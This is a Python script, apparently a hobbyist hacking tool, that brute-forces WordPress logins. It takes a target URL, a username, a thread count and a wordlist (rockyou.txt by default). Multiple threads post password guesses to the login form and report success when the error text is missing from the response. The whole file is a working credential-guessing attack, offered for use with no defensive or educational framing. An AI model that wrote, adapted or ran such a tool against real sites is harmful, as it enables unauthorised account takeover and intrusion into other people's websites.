#!/usr/bin/python3

import signal
import time
from pwn import *

#Colors
class colors():
        GREEN = "\033[0;32m\033[1m"
        END = "\033[0m"
        RED = "\033[0;31m\033[1m"
        BLUE = "\033[0;34m\033[1m"
        YELLOW = "\033[0;33m\033[1m"
        PURPLE = "\033[0;35m\033[1m"
        TURQUOISE = "\033[0;36m\033[1m"
        GRAY = "\033[0;37m\033[1m"

def def_handler(signal, frame):
	print(colors.RED + "\n[!] Exiting...\n" + colors.END)

	if threading.activeCount() > 1:
		os.system("tput cnorm")
		os._exit(getattr(os, "_exitcode", 0))
	else:
		os.system("tput cnorm")
		sys.exit(getattr(os, "_exitcode", 0))

signal.signal(signal.SIGINT, def_handler)

def banner():
	print('\n     \t' + colors.PURPLE + '_/_/_/                          _/                _/_/_/\n\t' + colors.BLUE + '    _/    _/  _/  _/_/  _/    _/  _/_/_/_/    _/_/    _/    _/  _/  _/_/    _/_/      _/_/_/    _/_/_/\n\t   _/_/_/    _/_/      _/    _/    _/      _/_/_/_/  _/_/_/    _/_/      _/_/_/_/  _/_/      _/_/\n\t' + colors.TURQUOISE + '  _/    _/  _/        _/    _/    _/      _/        _/        _/        _/            _/_/      _/_/\n\t _/_/_/    _/          _/_/_/      _/_/    _/_/_/  _/        _/          _/_/_/  _/_/_/    _/_/_/\n' + colors.GRAY + '\n | ' + colors.YELLOW + 'BY ' + colors.GREEN + 'Invertebrado' + colors.GRAY + ' |' + colors.GRAY + '\t| ' + colors.YELLOW + 'PERSONAL PAGE ' + colors.PURPLE + ' https://invertebr4do.github.io' + colors.GRAY + ' |' + colors.GRAY + '\t| ' + colors.YELLOW + 'GITHUB' + colors.BLUE + ' https://github.com/Invertebr4do' + colors.GRAY + ' |' + colors.END)
	time.sleep(0.5)

banner()

print("\n" + colors.GREEN + "-"*80 + "\n" + colors.END)

while True:
	url = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL" + colors.PURPLE + " ~> " + colors.END).rstrip("\n"))

	if len(url.rstrip()) < 1:
		print(colors.RED + "\n[!] Invalid URL\n" + colors.END)

	else:
		break

while True:
	language = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL page language " + colors.PURPLE + "[" + colors.GRAY + "en/es" + colors.PURPLE + "] ~> " + colors.END).strip())

	if len(language.rstrip()) < 2 or len(language.rstrip()) > 2 or language.rstrip("\n").lower() != 'en' and language.rstrip("\n").lower() != 'es':
		print(colors.RED + "\n[!] Invalid language\n" + colors.END)

	else:
		break

while True:
	user = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Enter the username" + colors.PURPLE + " ~> " + colors.END).rstrip("\n"))

	if len(user.rstrip()) < 1:
		print(colors.RED + "\n[!] Invalid username" + colors.END)

	else:
		break

while True:
	n_t = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "How many threads do you want to use?" + colors.PURPLE + " ~> " + colors.END))

	try:
		if int(n_t) < 1:
			n_t = 1
			break

		elif int(n_t) > 50:
			time.sleep(0.3)
			print(colors.RED + "-"*54 + colors.END + "\n")
			log.warning("Using too many threads could give false positives\n\n")
			print(colors.RED + "-"*54)
			time.sleep(1)
			break

		else:
			break

	except:
		print(colors.RED + "\n[!] Invalid number" + colors.END)

while True:
	WDictionary = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Do you want to use your own wordlist? " + colors.PURPLE + "[" + colors.GRAY + "Y/N" + colors.PURPLE + "] ~> " + colors.END))

	if WDictionary.upper().rstrip("\n") == 'Y':
		try:
			wordlist = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Enter the wordlist path" + colors.PURPLE + " ~> " + colors.END))
			dictionary = open(wordlist.rstrip("\n"), 'r')
			break
		except:
			print(colors.RED + "\n[!] Invalid path" + colors.END)

	elif WDictionary.upper().rstrip("\n") == 'N':
		dictionary = open("/usr/share/wordlists/rockyou.txt", 'r')
		break

	else:
		print(colors.RED + "\n[!] Invalid option" + colors.END)

print("\n" + colors.PURPLE + "-"*80 + "\n" + colors.END)

p2 = log.info("Bruteforcing %s" % user)
p1 = log.progress("Password")

def makeRequest():

	cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}

	for i in dictionary:
		data = {
			'log': user,
			'pwd': i,
			'wp-submit': 'Log+In',
			'testcookie': '1'
		}

		r = requests.post(url.rstrip("\n"), data=data, cookies=cookie)
		
		p1.status("%s" % i)

		if language.lower().rstrip("\n") == "en":
			if "incorrect" not in r.text:
				p1.success("%s" % i)

				if threading.activeCount() > 1:
					os.system("tput cnorm")
					os._exit(getattr(os, "_exitcode", 0))
				else:
					os.system("tput cnorm")
					sys.exit(getattr(os, "_exitcode", 0))

		if language.lower().rstrip("\n") ==  "es":
			if "correcta." not in r.text:
				p1.success("%s" % i)

				if threading.activeCount() > 1:
					os.system("tput cnorm")
					os._exit(getattr(os, "_exitcode", 0))
				else:
					os.system("tput cnorm")
					sys.exit(getattr(os, "_exitcode", 0))

if __name__ == '__main__':

	threads = []

	try:
		for i in range(0, int(n_t)):
			t = threading.Thread(target=makeRequest)
			threads.append(t)
			sys.stderr = open("/dev/null", "w")

		for x in threads:
			x.start()

		for x in threads:
			x.join()

	except Exception as e:
		log.failure(str(e))
		sys.exit(1)
